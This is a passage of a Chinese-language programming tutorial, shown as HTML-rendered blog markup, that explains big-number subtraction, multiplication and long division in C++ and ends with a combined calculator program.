class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">  <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">    <span class="comment">// 逐位相减</span></span><br><span class="line">    c[i] += a[i] - b[i];</span><br><span class="line">    <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 借位</span></span><br><span class="line">      c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">      c[i] += <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将上一个程序中的 <code>add()</code> 替换成 <code>sub()</code>，就有了一个减法计算器。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] - b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">            c[i] += <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sub</span>(a, b, c);</span><br><span class="line">    <span class="built_in">print</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>试一试，输入 <code>1 2</code>——输出 <code>/9999999</code>，诶这个怎么给了我一份假的代码啊……</p><p>事实上，上面的代码只能处理减数 $a$ 大于等于被减数 $b$ 的情况。处理被减数比减数小，即 $a&lt;b$ 时的情况很简单。</p><p>$a-b=-(b-a)$</p><p>要计算 $b-a$ 的值，因为有 $b&gt;a$，可以调用以上代码中的 <code>sub</code> 函数，写法为 <code>sub(b,a,c)</code>。要得到 $a-b$ 的值，在得数前加上负号即可。</p><h4 id="乘法"><a href="#乘法" class="headerlink" title="乘法"></a>乘法</h4><h5 id="高精度—单精度"><a href="#高精度—单精度" class="headerlink" title="高精度—单精度"></a>高精度—单精度</h5><p>高精度乘法，也就是竖……等会儿等会儿！</p><p>先考虑一个简单的情况：乘数中的一个是普通的 <code>int</code> 类型。有没有简单的处理方法呢？</p><p>一个直观的思路是直接将 $a$ 每一位上的数字乘以 $b$。从数值上来说，这个方法是正确的，但它并不符合十进制表示法，因此需要将它重新整理成正常的样子。</p><p>重整的方式，也是从个位开始逐位向上处理进位。但是这里的进位可能非常大，甚至远大于 $9$，因为每一位被乘上之后都可能达到 $9b$ 的数量级。所以这里的进位不能再简单地进行 $-10$ 运算，而是要通过除以 $10$ 的商以及余数计算。详见代码注释，也可以参考下图展示的一个计算高精度数 $1337$ 乘以单精度数 $42$ 的过程。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/multiplication-short.png"></p><p>当然，也是出于这个原因，这个方法需要特别关注乘数 $b$ 的范围。若它和 $10^9$（或相应整型的取值上界）属于同一数量级，那么需要慎用高精度—单精度乘法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul_short</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b, <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 直接把 a 的第 i 位数码乘以乘数，加入结果</span></span><br><span class="line">        c[i] += a[i] * b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 处理进位</span></span><br><span class="line">            <span class="comment">// c[i] / 10 即除法的商数成为进位的增量值</span></span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            <span class="comment">// 而 c[i] % 10 即除法的余数成为在当前位留下的值</span></span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="高精度—高精度"><a href="#高精度—高精度" class="headerlink" title="高精度—高精度"></a>高精度—高精度</h5><p>如果两个乘数都是高精度，那么竖式乘法又可以大显身手了。</p><p>回想竖式乘法的每一步，实际上是计算了若干 $a \times b_i \times 10^i$ 的和。例如计算 $1337 \times 42$，计算的就是 $1337 \times 2 \times 10^0 + 1337 \times 4 \times 10^1$。</p><p>于是可以将 $b$ 分解为它的所有数码，其中每个数码都是单精度数，将它们分别与 $a$ 相乘，再向左移动到各自的位置上相加即得答案。当然，最后也需要用与上例相同的方式处理进位。</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/multiplication-long.png"></p><p>注意这个过程与竖式乘法不尽相同，我们的算法在每一步乘的过程中并不进位，而是将所有的结果保留在对应的位置上，到最后再统一处理进位，但这不会影响结果。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="comment">// 这里直接计算结果中的从低到高第 i 位，且一并处理了进位</span></span><br><span class="line">        <span class="comment">// 第 i 次循环为 c[i] 加上了所有满足 p + q = i 的 a[p] 与 b[q] 的乘积之和</span></span><br><span class="line">        <span class="comment">// 这样做的效果和直接进行上图的运算最后求和是一样的，只是更加简短的一种实现方式</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="除法"><a href="#除法" class="headerlink" title="除法"></a>除法</h4><p>高精度除法，也就是竖～～～～竖式长除法啦！</p><p><img src="/2022/08/03/%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/division.png"></p><p>竖式长除法实际上可以看作一个逐次减法的过程。例如上图中商数十位的计算可以这样理解：将 $45$ 减去三次 $12$ 后变得小于 $12$，不能再减，故此位为 $3$。</p><p>为了减少冗余运算，我们提前得到被除数的长度 $l_a$ 与除数的长度 $l_b$，从下标 $l_a - l_b$ 开始，从高位到低位来计算商。这和手工计算时将第一次乘法的最高位与被除数最高位对齐的做法是一样的。</p><p>参考程序实现了一个函数 <code>greater_eq()</code> 用于判断被除数以下标 <code>last_dg</code> 为最低位，是否可以再减去除数而保持非负。此后对于商的每一位，不断调用 <code>greater_eq()</code>，并在成立的时候用高精度减法从余数中减去除数，也即模拟了竖式除法的过程。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 被除数 a 以下标 last_dg 为最低位，是否可以再减去除数 b 而保持非负</span></span><br><span class="line"><span class="comment">// len 是除数 b 的长度，避免反复计算</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">greater_eq</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> last_dg, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 有可能被除数剩余的部分比除数长，这个情况下最多多出 1 位，故如此判断即可</span></span><br><span class="line">    <span class="keyword">if</span> (a[last_dg + len] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="comment">// 从高位到低位，逐位比较</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &gt; b[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &lt; b[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 相等的情形下也是可行的</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[], <span class="keyword">int</span> d[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="built_in">clear</span>(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> la, lb;</span><br><span class="line">    <span class="keyword">for</span> (la = LEN - <span class="number">1</span>; la &gt; <span class="number">0</span>; --la)</span><br><span class="line">        <span class="keyword">if</span> (a[la - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (lb = LEN - <span class="number">1</span>; lb &gt; <span class="number">0</span>; --lb)</span><br><span class="line">        <span class="keyword">if</span> (b[lb - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (lb == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;  <span class="comment">// 除数不能为零</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// c 是商</span></span><br><span class="line">    <span class="comment">// d 是被除数的剩余部分，算法结束后自然成为余数</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; la; ++i) d[i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = la - lb; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="comment">// 计算商的第 i 位</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">greater_eq</span>(d, b, i, lb)) &#123;</span><br><span class="line">            <span class="comment">// 若可以减，则减</span></span><br><span class="line">            <span class="comment">// 这一段是一个高精度减法</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lb; ++j) &#123;</span><br><span class="line">                d[i + j] -= b[j];</span><br><span class="line">                <span class="keyword">if</span> (d[i + j] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    d[i + j + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">                    d[i + j] += <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 使商的这一位增加 1</span></span><br><span class="line">            c[i] += <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 返回循环开头，重新检查</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="入门篇完成！"><a href="#入门篇完成！" class="headerlink" title="入门篇完成！"></a>入门篇完成！</h2><p>将上面介绍的四则运算的实现结合，即可完成开头提到的计算器程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> LEN = <span class="number">1004</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a[LEN], b[LEN], c[LEN], d[LEN];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clear</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN; ++i) a[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> s[LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">clear</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) a[len - i - <span class="number">1</span>] = s[i] - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">int</span> a[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = LEN - <span class="number">1</span>; i &gt;= <span class="number">1</span>; --i)</span><br><span class="line">        <span class="keyword">if</span> (a[i] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (; i &gt;= <span class="number">0</span>; --i) <span class="built_in">putchar</span>(a[i] + <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] + b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += <span class="number">1</span>;</span><br><span class="line">            c[i] -= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        c[i] += a[i] - b[i];</span><br><span class="line">        <span class="keyword">if</span> (c[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">            c[i] += <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; LEN - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt;= i; ++j) c[i] += a[j] * b[i - j];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (c[i] &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            c[i + <span class="number">1</span>] += c[i] / <span class="number">10</span>;</span><br><span class="line">            c[i] %= <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">greater_eq</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> last_dg, <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[last_dg + len] != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = len - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &gt; b[i]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (a[last_dg + i] &lt; b[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">div</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> b[], <span class="keyword">int</span> c[], <span class="keyword">int</span> d[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">clear</span>(c);</span><br><span class="line">    <span class="built_in">clear</span>(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> la, lb;</span><br><span class="line">    <span class="keyword">for</span> (la = LEN - <span class="number">1</span>; la &gt; <span class="number">0</span>; --la)</span><br><span class="line">        <span class="keyword">if</span> (a[la - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span> (lb = LEN - <span class="number">1</span>; lb &gt; <span class="number">0</span>; --lb)</span><br><span class="line">        <span class="keyword">if</span> (b[lb - <span class="number">1</span>] != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (lb == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt; &lt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; la; ++i) d[i] = a[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = la - lb; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">greater_eq</span>(d, b, i, lb)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; lb; ++j) &#123;</span><br><span class="line">                d[i + j] -= b[j];</span><br><span class="line">                <span class="keyword">if</span> (d[i + j] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    d[i + j + <span class="number">1</span>] -= <span class="number">1</span>;</span><br><span class="line">                    d[i + j] += <span class="number">10</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            c[i] += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">read</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> op[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, op);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">read</span>(b);</span><br><span class="line"></span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (op[<span class="number">0</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            <span class="built_in">add</span>(a, b, c);</span><br><span class="line">            <span 